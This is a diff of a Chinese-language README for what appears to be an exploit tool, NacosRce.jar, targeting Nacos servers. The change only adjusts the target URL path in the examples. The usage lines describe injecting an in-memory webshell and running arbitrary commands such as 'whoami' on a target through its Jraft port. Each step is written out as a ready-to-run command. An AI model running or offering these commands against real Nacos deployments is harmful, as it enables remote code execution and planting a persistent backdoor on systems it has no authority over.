@@ -15,11 +15,11 @@
 1. 自动注入内存马并执行命令	java -jar NacosRce.jar Url Jraft端口 "Command"
    <br />	
    ```shell
-   java -jar NacosRce.jar http://192.168.90.1:8848  7848 "whoami"
+   java -jar NacosRce.jar http://192.168.90.1:8848/nacos  7848 "whoami"
    ```
 2. 只注入内存马
    ```shell
-      java -jar NacosRce.jar http://192.168.90.1:8848 7848 memshell
+      java -jar NacosRce.jar http://192.168.90.1:8848/nacos 7848 memshell
    ```
    
    <br />
